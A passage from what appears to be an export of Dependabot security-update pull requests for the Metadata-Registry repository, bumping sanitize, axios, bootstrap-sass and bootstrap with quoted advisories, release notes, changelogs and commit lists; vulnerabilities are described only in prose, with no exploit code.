<li><code>noframes</code></li>
<li><code>noscript</code></li>
<li><code>plaintext</code></li>
<li><code>script</code></li>
<li><code>style</code></li>
<li><code>svg</code></li>
<li><code>xmp</code></li>
</ul>
<h3>Impact</h3>
<p>Using carefully crafted input, an attacker may be able to sneak arbitrary HTML through Sanitize, potentially resulting in XSS (cross-site scripting) or other undesired behavior when that HTML is rendered in a browser.</p>
<h3>Releases</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &gt;= 3.0.0, &lt; 5.2.1</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/rgrove/sanitize/releases"">sanitize's releases</a>.</em></p>
<blockquote>
<h2>v5.2.3</h2>
<h3>Bug Fixes</h3>
<ul>
<li>Ensure protocol sanitization is applied to data attributes. [<a href=""https://github.com/ccutrer""><code>@ccutrer</code></a> - <a href=""https://github-redirect.dependabot.com/rgrove/sanitize/issues/207"">#207</a>]<a href=""https://github-redirect.dependabot.com/rgrove/sanitize/pull/207"">207</a></li>
</ul>
<h2>v5.2.2</h2>
<h3>Bug Fixes</h3>
<ul>
<li>Fixed a deprecation warning in Ruby 2.7+ when using keyword arguments in a custom transformer. [<a href=""https://github.com/mscrivo""><code>@mscrivo</code></a> - <a href=""https://github-redirect.dependabot.com/rgrove/sanitize/issues/206"">#206</a>]<a href=""https://github-redirect.dependabot.com/rgrove/sanitize/pull/206"">206</a></li>
</ul>
<h2>v5.2.1</h2>
<h3>Bug Fixes</h3>
<ul>
<li>
<p>Fixed an HTML sanitization bypass that could allow XSS. This issue affects Sanitize versions 3.0.0 through 5.2.0.</p>
<p>When HTML was sanitized using the &quot;relaxed&quot; config or a custom config that allows certain elements, some content in a <code>&lt;math&gt;</code> or <code>&lt;svg&gt;</code> element may not have beeen sanitized correctly even if <code>math</code> and <code>svg</code> were not in the allowlist. This could allow carefully crafted input to sneak arbitrary HTML through Sanitize, potentially enabling an XSS (cross-site scripting) attack.</p>
<p>You are likely to be vulnerable to this issue if you use Sanitize's relaxed config or a custom config that allows one or more of the following HTML elements:</p>
<ul>
<li><code>iframe</code></li>
<li><code>math</code></li>
<li><code>noembed</code></li>
<li><code>noframes</code></li>
<li><code>noscript</code></li>
<li><code>plaintext</code></li>
<li><code>script</code></li>
<li><code>style</code></li>
<li><code>svg</code></li>
<li><code>xmp</code></li>
</ul>
<p>See the security advisory for more details, including a workaround if you're not able to upgrade: <a href=""https://github.com/rgrove/sanitize/security/advisories/GHSA-p4x4-rw2p-8j8m"">GHSA-p4x4-rw2p-8j8m</a></p>
<p>Many thanks to Michał Bentkowski of Securitum for reporting this issue and helping to verify the fix.</p>
</li>
</ul>
<h2>v5.2.0</h2>
<h3>Changes</h3>
<ul>
<li>
<p>The term &quot;whitelist&quot; has been replaced with &quot;allowlist&quot; throughout Sanitize's source and documentation.</p>
<p>While the etymology of &quot;whitelist&quot; may not be explicitly racist in origin or intent, there are inherent racial connotations in the implication that white is good and black (as in &quot;blacklist&quot;) is not.</p>
<p>This is a change I should have made long ago, and I apologize for not making it sooner.</p>
</li>
<li>
<p>In transformer input, the <code>:is_whitelisted</code> and <code>:node_whitelist</code> keys are now deprecated. New <code>:is_allowlisted</code> and <code>:node_allowlist</code> keys have been added. The old keys will continue to work in order to avoid breaking existing code, but they are no longer documented and may be removed in a future semver major release.</p>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/rgrove/sanitize/blob/master/HISTORY.md"">sanitize's changelog</a>.</em></p>
<blockquote>
<h2>5.2.3 (2021-01-11)</h2>
<h3>Bug Fixes</h3>
<ul>
<li>Ensure protocol sanitization is applied to data attributes.
[<a href=""https://github.com/ccutrer""><code>@ccutrer</code></a> - <a href=""https://github-redirect.dependabot.com/rgrove/sanitize/issues/207"">#207</a>]<a href=""https://github-redirect.dependabot.com/rgrove/sanitize/pull/207"">207</a></li>
</ul>
<h2>5.2.2 (2021-01-06)</h2>
<h3>Bug Fixes</h3>
<ul>
<li>Fixed a deprecation warning in Ruby 2.7+ when using keyword arguments in a
custom transformer. [<a href=""https://github.com/mscrivo""><code>@mscrivo</code></a> - <a href=""https://github-redirect.dependabot.com/rgrove/sanitize/issues/206"">#206</a>]<a href=""https://github-redirect.dependabot.com/rgrove/sanitize/pull/206"">206</a></li>
</ul>
<h2>5.2.1 (2020-06-16)</h2>
<h3>Bug Fixes</h3>
<ul>
<li>
<p>Fixed an HTML sanitization bypass that could allow XSS. This issue affects
Sanitize versions 3.0.0 through 5.2.0.</p>
<p>When HTML was sanitized using the &quot;relaxed&quot; config or a custom config that
allows certain elements, some content in a <code>&lt;math&gt;</code> or <code>&lt;svg&gt;</code> element may not
have beeen sanitized correctly even if <code>math</code> and <code>svg</code> were not in the
allowlist. This could allow carefully crafted input to sneak arbitrary HTML
through Sanitize, potentially enabling an XSS (cross-site scripting) attack.</p>
<p>You are likely to be vulnerable to this issue if you use Sanitize's relaxed
config or a custom config that allows one or more of the following HTML
elements:</p>
<ul>
<li><code>iframe</code></li>
<li><code>math</code></li>
<li><code>noembed</code></li>
<li><code>noframes</code></li>
<li><code>noscript</code></li>
<li><code>plaintext</code></li>
<li><code>script</code></li>
<li><code>style</code></li>
<li><code>svg</code></li>
<li><code>xmp</code></li>
</ul>
<p>See the security advisory for more details, including a workaround if you're
not able to upgrade: [GHSA-p4x4-rw2p-8j8m]</p>
<p>Many thanks to Michał Bentkowski of Securitum for reporting this issue and</p>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/rgrove/sanitize/commit/9b8b55b6b90895a232f4243eaf5a4e6454136e20""><code>9b8b55b</code></a> Release 5.2.3</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/eaaaa9d1dd3714c8467b9169edf2ecd1e2a3e277""><code>eaaaa9d</code></a> Clarify comments</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/fac1a2ea3750630d5cb482b9c19fdac703356580""><code>fac1a2e</code></a> ensure protocol processing happens on data attributes</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/4f6858ff9f6e3e7ed6d0fba85a2a8fd1d37594df""><code>4f6858f</code></a> Link the Tests badge to the workflow page</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/1c661dc15ad5872f07988e5aced68c68a328c099""><code>1c661dc</code></a> Remove Travis</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/cd68389b041405e47bc5c400ea5c0c63cd5786da""><code>cd68389</code></a> Add GitHub Actions workflow</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/4ea3d8ec48563f19c0927153ae1217fd9aa3d962""><code>4ea3d8e</code></a> Release 5.2.2</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/7a7dd3ed42145de137cee2c987d1667ce428837f""><code>7a7dd3e</code></a> Add Ruby 3.0 to the Travis matrix.</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/361cc0515aea77de9905140f6fc2546812b5dc05""><code>361cc05</code></a> Fix warning in Ruby 2.7+</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/b032474dbc5a567e41c12d8481e8d4265b51588e""><code>b032474</code></a> Merge branch 'ajmalmsali-patch-1'</li>
<li>Additional commits viewable in <a href=""https://github.com/rgrove/sanitize/compare/v4.6.4...v5.2.3"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=sanitize&package-manager=bundler&previous-version=4.6.4&new-version=5.2.3)](https://dependabot.com/compatibility-score/?dependency-name=sanitize&package-manager=bundler&previous-version=4.6.4&new-version=5.2.3)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"security,dependencies,"
jonphipps/Metadata-Registry,772832761,"[Security] Bump axios from 0.17.1 to 0.21.1","Bumps [axios](https://github.com/axios/axios) from 0.17.1 to 0.21.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>High severity vulnerability that affects axios</strong>
Axios up to and including 0.18.0 allows attackers to cause a denial of service (application crash) by continuing to accepting content after maxContentLength is exceeded.</p>
<p>Affected versions: &lt;= 0.18.0</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/axios/axios/releases"">axios's releases</a>.</em></p>
<blockquote>
<h2>v0.21.0</h2>
<h3>0.21.0 (October 23, 2020)</h3>
<p>Fixes and Functionality:</p>
<ul>
<li>Fixing requestHeaders.Authorization (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3287"">#3287</a>)</li>
<li>Fixing node types (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3237"">#3237</a>)</li>
<li>Fixing axios.delete ignores config.data (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3282"">#3282</a>)</li>
<li>Revert &quot;Fixing overwrite Blob/File type as Content-Type in browser. (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/1773"">#1773</a>)&quot; (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3289"">#3289</a>)</li>
<li>Fixing an issue that type 'null' and 'undefined' is not assignable to validateStatus when typescript strict option is enabled (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3200"">#3200</a>)</li>
</ul>
<p>Internal and Tests:</p>
<ul>
<li>Lock travis to not use node v15 (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3361"">#3361</a>)</li>
</ul>
<p>Documentation:</p>
<ul>
<li>Fixing simple typo, existant -&gt; existent (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3252"">#3252</a>)</li>
<li>Fixing typos (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3309"">#3309</a>)</li>
</ul>
<p>Huge thanks to everyone who contributed to this release via code (authors listed below) or via reviews and triaging on GitHub:</p>
<ul>
<li>Allan Cruz <a href=""mailto:57270969+Allanbcruz@users.noreply.github.com"">57270969+Allanbcruz@users.noreply.github.com</a></li>
<li>George Cheng <a href=""mailto:Gerhut@GMail.com"">Gerhut@GMail.com</a></li>
<li>Jay <a href=""mailto:jasonsaayman@gmail.com"">jasonsaayman@gmail.com</a></li>
<li>Kevin Kirsche <a href=""mailto:Kev.Kirsche+GitHub@gmail.com"">Kev.Kirsche+GitHub@gmail.com</a></li>
<li>Remco Haszing <a href=""mailto:remcohaszing@gmail.com"">remcohaszing@gmail.com</a></li>
<li>Taemin Shin <a href=""mailto:cprayer13@gmail.com"">cprayer13@gmail.com</a></li>
<li>Tim Gates <a href=""mailto:tim.gates@iress.com"">tim.gates@iress.com</a></li>
<li>Xianming Zhong <a href=""mailto:chinesedfan@qq.com"">chinesedfan@qq.com</a></li>
</ul>
<h2>v0.20.0</h2>
<p>Release of 0.20.0-pre as a full release with no other changes.</p>
<h2>v0.20.0-0</h2>
<h3>0.20.0-pre (July 15, 2020)</h3>
<p>Fixes and Functionality:</p>
<ul>
<li>Fixing response with utf-8 BOM can not parse to json (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/2419"">#2419</a>)
<ul>
<li>fix: remove byte order marker (UTF-8 BOM) when transform response</li>
<li>fix: remove BOM only utf-8</li>
<li>test: utf-8 BOM</li>
<li>fix: incorrect param name</li>
</ul>
</li>
<li>Refactor mergeConfig without utils.deepMerge (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/2844"">#2844</a>)
<ul>
<li>Adding failing test</li>
<li>Fixing <a href=""https://github-redirect.dependabot.com/axios/axios/issues/2587"">#2587</a> default custom config persisting</li>
<li>Adding Concat keys and filter duplicates</li>
<li>Fixed value from CPE</li>
<li>update for review feedbacks</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/axios/axios/blob/v0.21.1/CHANGELOG.md"">axios's changelog</a>.</em></p>
<blockquote>
<h3>0.21.1 (December 21, 2020)</h3>
<p>Fixes and Functionality:</p>
<ul>
<li>Hotfix: Prevent SSRF (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3410"">#3410</a>)</li>
<li>Protocol not parsed when setting proxy config from env vars (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3070"">#3070</a>)</li>
<li>Updating axios in types to be lower case (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/2797"">#2797</a>)</li>
<li>Adding a type guard for <code>AxiosError</code> (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/2949"">#2949</a>)</li>
</ul>
<p>Internal and Tests:</p>
<ul>
<li>Remove the skipping of the <code>socket</code> http test (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3364"">#3364</a>)</li>
<li>Use different socket for Win32 test (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3375"">#3375</a>)</li>
</ul>
<p>Huge thanks to everyone who contributed to this release via code (authors listed below) or via reviews and triaging on GitHub:</p>
<ul>
<li>Daniel Lopretto <a href=""mailto:timemachine3030@users.noreply.github.com"">timemachine3030@users.noreply.github.com</a></li>
<li>Jason Kwok <a href=""mailto:JasonHK@users.noreply.github.com"">JasonHK@users.noreply.github.com</a></li>
<li>Jay <a href=""mailto:jasonsaayman@gmail.com"">jasonsaayman@gmail.com</a></li>
<li>Jonathan Foster <a href=""mailto:jonathan@jonathanfoster.io"">jonathan@jonathanfoster.io</a></li>
<li>Remco Haszing <a href=""mailto:remcohaszing@gmail.com"">remcohaszing@gmail.com</a></li>
<li>Xianming Zhong <a href=""mailto:chinesedfan@qq.com"">chinesedfan@qq.com</a></li>
</ul>
<h3>0.21.0 (October 23, 2020)</h3>
<p>Fixes and Functionality:</p>
<ul>
<li>Fixing requestHeaders.Authorization (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3287"">#3287</a>)</li>
<li>Fixing node types (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3237"">#3237</a>)</li>
<li>Fixing axios.delete ignores config.data (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3282"">#3282</a>)</li>
<li>Revert &quot;Fixing overwrite Blob/File type as Content-Type in browser. (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/1773"">#1773</a>)&quot; (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3289"">#3289</a>)</li>
<li>Fixing an issue that type 'null' and 'undefined' is not assignable to validateStatus when typescript strict option is enabled (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3200"">#3200</a>)</li>
</ul>
<p>Internal and Tests:</p>
<ul>
<li>Lock travis to not use node v15 (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3361"">#3361</a>)</li>
</ul>
<p>Documentation:</p>
<ul>
<li>Fixing simple typo, existant -&gt; existent (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3252"">#3252</a>)</li>
<li>Fixing typos (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3309"">#3309</a>)</li>
</ul>
<p>Huge thanks to everyone who contributed to this release via code (authors listed below) or via reviews and triaging on GitHub:</p>
<ul>
<li>Allan Cruz <a href=""mailto:57270969+Allanbcruz@users.noreply.github.com"">57270969+Allanbcruz@users.noreply.github.com</a></li>
<li>George Cheng <a href=""mailto:Gerhut@GMail.com"">Gerhut@GMail.com</a></li>
<li>Jay <a href=""mailto:jasonsaayman@gmail.com"">jasonsaayman@gmail.com</a></li>
<li>Kevin Kirsche <a href=""mailto:Kev.Kirsche+GitHub@gmail.com"">Kev.Kirsche+GitHub@gmail.com</a></li>
<li>Remco Haszing <a href=""mailto:remcohaszing@gmail.com"">remcohaszing@gmail.com</a></li>
<li>Taemin Shin <a href=""mailto:cprayer13@gmail.com"">cprayer13@gmail.com</a></li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/axios/axios/commit/a64050a6cfbcc708a55a7dc8030d85b1c78cdf38""><code>a64050a</code></a> Releasing 0.21.1</li>
<li><a href=""https://github.com/axios/axios/commit/d57cd976f3cc0f1c5bb1f0681660e50004781db5""><code>d57cd97</code></a> Updating changelog for 0.21.1 release</li>
<li><a href=""https://github.com/axios/axios/commit/8b0f373df0574b7cb3c6b531b4092cd670dac6e3""><code>8b0f373</code></a> Use different socket for Win32 test (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3375"">#3375</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/e426910be7c417bdbcde9c18cb184ead826fc0e1""><code>e426910</code></a> Protocol not parsed when setting proxy config from env vars (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3070"">#3070</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/c7329fefc890050edd51e40e469a154d0117fc55""><code>c7329fe</code></a> Hotfix: Prevent SSRF (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3410"">#3410</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/f472e5da5fe76c72db703d6a0f5190e4ad31e642""><code>f472e5d</code></a> Adding a type guard for <code>AxiosError</code> (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/2949"">#2949</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/768825589fd0d36b64a66717ca6df2efd8fb7844""><code>7688255</code></a> Remove the skipping of the <code>socket</code> http test (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3364"">#3364</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/820fe6e41a96f05fb4781673ce07486f1b37515d""><code>820fe6e</code></a> Updating axios in types to be lower case (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/2797"">#2797</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/94ca24b5b23f343769a15f325693246e07c177d2""><code>94ca24b</code></a> Releasing 0.21.0</li>
<li><a href=""https://github.com/axios/axios/commit/2130a0c8acc588c72b53dfef31a11442043ffb06""><code>2130a0c</code></a> Updating changelog for 0.21.0 release</li>
<li>Additional commits viewable in <a href=""https://github.com/axios/axios/compare/v0.17.1...v0.21.1"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~emilyemorehouse"">emilyemorehouse</a>, a new releaser for axios since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=axios&package-manager=npm_and_yarn&previous-version=0.17.1&new-version=0.21.1)](https://dependabot.com/compatibility-score/?dependency-name=axios&package-manager=npm_and_yarn&previous-version=0.17.1&new-version=0.21.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,579167698,"[Security] Bump bootstrap-sass from 3.3.7 to 3.4.1","Bumps [bootstrap-sass](https://github.com/twbs/bootstrap-sass) from 3.3.7 to 3.4.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects bootstrap and bootstrap-sass</strong>
In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: <a href=""https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/"">https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/</a></p>
<p>Affected versions: &gt;= 3.0.0 &lt; 3.4.1</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/twbs/bootstrap-sass/releases"">bootstrap-sass's releases</a>.</em></p>
<blockquote>
<h2>v3.4.1</h2>
<ul>
<li><strong>Security:</strong> Fixed an XSS vulnerability (CVE-2019-8331) in our tooltip and popover plugins by implementing a new HTML sanitizer</li>
<li>Handle bad selectors (<code>#</code>) in <code>data-target</code> for Dropdowns</li>
<li>Clarified tooltip selector documentation</li>
<li>Added support for NuGet contentFiles</li>
</ul>
<h2>v3.4.0</h2>
<ul>
<li><strong>New</strong>: Added a .row-no-gutters class.</li>
<li><strong>New</strong>: Added docs searching via Algolia.</li>
<li><strong>Fixed</strong>: Resolved an XSS issue in Alert, Carousel, Collapse, Dropdown, Modal, and Tab components. See <a href=""https://snyk.io/vuln/npm:bootstrap:20160627"">https://snyk.io/vuln/npm:bootstrap:20160627</a> for details.</li>
<li><strong>Fixed</strong>: Added padding to .navbar-fixed-* on modal open</li>
<li><strong>Fixed</strong>: Removed the double border on <abbr> elements.</li>
<li><strong>Removed</strong> Gist creation in web-based Customizer since anonymous gists were disabled long ago by GitHub.</li>
<li><strong>Removed</strong> drag and drop support from Customizer since it didn’t work anymore.</li>
</ul>
<p>Framework version: Bootstrap <strong>v3.4.0</strong>
See <a href=""http://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/"">the upstream blog post</a> for a detailed overview.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/twbs/bootstrap-sass/blob/master/CHANGELOG.md"">bootstrap-sass's changelog</a>.</em></p>
<blockquote>
<h1>Changelog</h1>
<h2>3.4.0</h2>
<ul>
<li>Bootstrap rubygem now depends on SassC instead of Sass.</li>
<li>Compass no longer supported.</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/b34765d8a6aa775816c59012b2d6b30c4c66a8e9""><code>b34765d</code></a> Rakefile: require 'bundler/gem_tasks'</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/143aa6ad684f0e990ea93ce8ff788427e52df1b5""><code>143aa6a</code></a> Bump bootstrap-sass to 3.4.1</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/69157ce76df1ccff394803811e582979cda4a993""><code>69157ce</code></a> rake convert[v3.4.1]</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/bb7dbf8af72b455b51936bc07e51efcaf6220bcc""><code>bb7dbf8</code></a> v3.4.0</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/3c126b3d9616bc07b6d976f8aee7ad662bd8013a""><code>3c126b3</code></a> Revert relative imports change</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/dcdef9bfd81a9821d775417dbdab4c5df3553ba2""><code>dcdef9b</code></a> Test Rails app: Depend on sassc-rails</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/cd1542b34577e36c8e80b4e258fceb742b2e26ad""><code>cd1542b</code></a> rake convert[v3.4.0]</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/07b9b642d4a189478290dd7dfbf5e2dbe239bf84""><code>07b9b64</code></a> less_conversion.rb: Update stylelint comment removal</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/6634d0a18a14046eb19c7b941be17d7a195604ca""><code>6634d0a</code></a> Remove compass support</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/489b6f2b809ad87c1d77ea6dcca1d7b0d24419bc""><code>489b6f2</code></a> lotus -&gt; hanami</li>
<li>Additional commits viewable in <a href=""https://github.com/twbs/bootstrap-sass/compare/v3.3.7...v3.4.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=bootstrap-sass&package-manager=npm_and_yarn&previous-version=3.3.7&new-version=3.4.1)](https://dependabot.com/compatibility-score/?dependency-name=bootstrap-sass&package-manager=npm_and_yarn&previous-version=3.3.7&new-version=3.4.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,577814856,"[Security] Bump bootstrap from 3.3.7 to 4.1.2","Bumps [bootstrap](https://github.com/twbs/bootstrap) from 3.3.7 to 4.1.2. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects bootstrap</strong>
In Bootstrap before 4.1.2, XSS is possible in the data-target property of scrollspy. This is similar to CVE-2018-14042.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects bootstrap</strong>
In Bootstrap before 4.1.2, XSS is possible in the data-target property of scrollspy. This is similar to CVE-2018-14042.</p>
<p>Affected versions: &lt; 4.1.2</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Low severity vulnerability that affects bootstrap</strong>
In Bootstrap 3.x before 3.4.0 and 4.x-beta before 4.0.0-beta.2, XSS is possible in the data-target attribute. Note that this is a different vulnerability than CVE-2018-14041.</p>
